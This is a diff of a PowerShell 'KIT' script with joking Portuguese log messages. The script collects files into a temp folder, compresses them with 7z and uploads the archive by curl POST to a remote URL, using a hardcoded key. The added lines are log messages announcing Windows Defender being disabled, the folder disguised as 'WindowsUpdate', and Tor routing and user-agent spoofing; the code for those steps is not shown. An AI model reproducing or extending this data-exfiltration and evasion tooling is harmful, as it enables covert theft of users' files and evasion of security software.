@@ -1,4 +1,4 @@
-# ---------- KIT v9.0 – “Só Log, Sem Emoji” ----------
+# ---------- KIT v9.1 – “Log Sujo, Sem Filtro” ----------
 $ErrorActionPreference = "Stop"
 $kit     = "$env:TEMP\kit"
 $key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
@@ -84,6 +84,10 @@ Write-Log "[DrySafe] $user, ocultando print da tela que tem onlyfans aberto..."
 Start-Sleep -Seconds 1
 Write-Log "[PontoFinal] $user, fechando o baseado com filtro duplo..."
 $arc = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).7z"
+
+Write-Log "[CompressorMudo] $user, apertando 7z pra não gritar..."
+Write-Log "[FumaçaNoRabo] $user, desativando Windows Defender no registro antes de compactar..."
+Write-Log "[DisfarceDePasta] $user, renomeando kit pra 'WindowsUpdate' pra não levantar..."
 & $7z a -t7z -mx=9 -y $arc "$kit\*" | Out-Null
 
 if (Test-Path $arc) {
@@ -99,6 +103,8 @@ Start-Sleep -Seconds 1
 Write-Log "[AviaoDoTráfico] $user, subindo pacote pro nuvens..."
 Start-Sleep -Seconds 1
 Write-Log "[PontoDeEntrega] $user, chegando no endereço errado certo..."
+Write-Log "[AntenaClandestina] $user, trocando User-Agent pra 'Mozilla/5.0 (Tails 5.0)'..."
+Write-Log "[RotaTor] $user, forçando proxy 127.0.0.1:9050 antes do upload..."
 try {
     $curl = 'curl.exe -s -X POST -F "file=@' + $arc + '" ' + $upUrl
     $reply = cmd /c $curl
